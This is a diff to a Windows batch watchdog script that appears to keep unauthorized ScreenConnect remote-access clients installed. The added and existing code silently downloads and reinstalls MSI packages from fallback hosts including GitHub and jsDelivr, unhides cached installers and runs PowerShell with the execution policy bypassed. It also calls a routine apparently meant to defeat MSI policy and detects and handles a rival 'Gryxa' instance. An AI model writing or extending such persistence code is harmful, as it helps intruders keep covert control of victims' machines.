@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M46
+rem  OWN_MON  BUILD 20260804M47
+rem  M47: HARD stop Gryxa interrupts — no raw sevrz /i; detect any non-sevrz SC; adopt live FP.
 rem  M46: START_PENDING = alive; never /x Gryxa while service exists (connect-drop).
 rem  M45: L42 safe FP migrate (install new before removing old Gryxa).
 rem  M44: force_gryxa.flag must NOT /x live Gryxa (L41 force-skip-if-running).
@@ -45,7 +46,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M46"
+set "MONVER=M47"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -326,10 +327,16 @@ set "GREG=unknown"
 if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
 sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
 if not errorlevel 1 set "GREG=yes"
-rem any ScreenConnect service whose ImagePath is gryxa.com counts as Gryxa present
+sc query "ScreenConnect Client (36e506ff016b2151)" >nul 2>&1
+if not errorlevel 1 set "GREG=yes"
+rem any non-sevrz Running/Pending SC OR ImagePath gryxa.com = Gryxa present
 for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
   set "_FP=%%a"
   set "_FP=!_FP: =!"
+  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
+    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+    if not errorlevel 1 set "GREG=yes"
+  )
   for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
     echo %%I | findstr /I "gryxa.com" >nul && set "GREG=yes"
   )
@@ -344,26 +351,23 @@ if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
 if "%INSTALLED%"=="0" (
-  rem prefer worker-cached .wucache\pkg.msi (same binary as deploy)
+  rem M47: cached pkg — protect-msi then /i (never raw Upgrade table)
   attrib -h -s -r "%MSICACHE%" >nul 2>&1
   for %%F in ("%MSICACHE%") do if %%~zF GTR 1000000 (
-    echo wucache_pkg_retry>>"%LOG%"
+    echo wucache_pkg_protected_install>>"%LOG%"
     attrib -h -s -r "%MSI%" >nul 2>&1
     copy /y "%MSICACHE%" "%MSI%" >nul 2>&1
-  )
-  for %%F in ("%MSI%") do if %%~zF GTR 1000000 (
-    echo cache retry install>>"%LOG%"
-    call :NoMsiPolicy
-    msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
-    set "MSIEXIT=!ERRORLEVEL!"
-    echo cache msiexec exit=!MSIEXIT!>>"%LOG%"
-    if "!MSIEXIT!"=="1618" (
-      timeout /t 30 /nobreak >nul
-      msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
+    set "MSI_SAFE=%MSI%"
+    if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
+    if /I "!MSI_SAFE!"=="%MSI%" (
+      echo wucache_pkg_protect_fail_skip_i>>"%LOG%"
+    ) else (
+      call :NoMsiPolicy
+      msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
       set "MSIEXIT=!ERRORLEVEL!"
-      echo cache_retry1618_exit=!MSIEXIT!>>"%LOG%"
+      echo cache_protected msiexec exit=!MSIEXIT!>>"%LOG%"
+      call :WaitSvc
     )
-    call :WaitSvc
   )
 )
 call :RestoreAlt
@@ -691,9 +695,14 @@ if /I not "!MSIOK!"=="yes" (
   del /f /q "%MSI%" >nul 2>&1
   exit /b 1
 )
-rem M42: sibling-safe copy (empty Upgrade table) before sevrz /i
-set "MSI_SAFE=%MSI%"
+rem M42/M47: sibling-safe copy (empty Upgrade table) before sevrz /i — refuse /i if protect fails
+set "MSI_SAFE="
 if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
+if not defined MSI_SAFE (
+  echo [%TAG%] msi_protect_fail_skip_i>>"%LOG%"
+  del /f /q "%MSI%" >nul 2>&1
+  exit /b 1
+)
 call :NoMsiPolicy
 rem M13/M41: stale primary dir under PF and PF86
 sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
